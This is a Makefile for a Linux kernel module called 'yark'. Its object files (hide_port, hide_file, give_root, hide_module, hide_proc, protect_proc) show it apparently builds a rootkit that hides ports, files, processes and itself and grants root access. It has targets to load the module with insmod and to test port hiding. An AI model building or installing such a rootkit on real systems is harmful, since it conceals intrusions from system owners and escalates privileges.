MODULE = yark
obj-m += $(MODULE).o
$(MODULE)-objs := main.o yhook.o command.o hide_port.o hide_file.o give_root.o hide_module.o hide_proc.o protect_proc.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

install: all
	sudo insmod $(MODULE).ko

uninstall:
	sudo rmmod $(MODULE).ko

test_port:
	sudo dmesg -C
	sudo insmod $(MODULE).ko
	sudo netstat -antp
	sudo rmmod $(MODULE)
	sudo dmesg